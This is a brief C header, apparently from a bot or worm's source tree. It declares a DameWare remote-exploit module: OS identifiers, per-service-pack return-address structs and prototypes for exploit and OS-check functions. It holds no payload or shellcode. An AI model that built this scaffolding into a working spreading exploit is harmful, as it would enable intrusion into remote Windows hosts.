/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////


#ifndef NO_DAMEWARE

#define ID_UNKNOWN	0
#define ID_WIN2K	1
#define ID_WINXP	2
#define ID_WIN2K3	3
#define ID_WINNT	4
#define VER			"0.5"

typedef struct sp_levels 
{	
	unsigned long eip;
	char library[20]; 

} SP_LEVELS; 

typedef struct target_os
{ 
	//int sp; 
	//unsigned long eip; 
	char os_type[10]; 
	struct sp_levels sp[7]; 

} TARGET_OS;


BOOL DameWare(EXINFO exinfo);
int check_os(char *host, unsigned short target_port, int *sp); 
#endif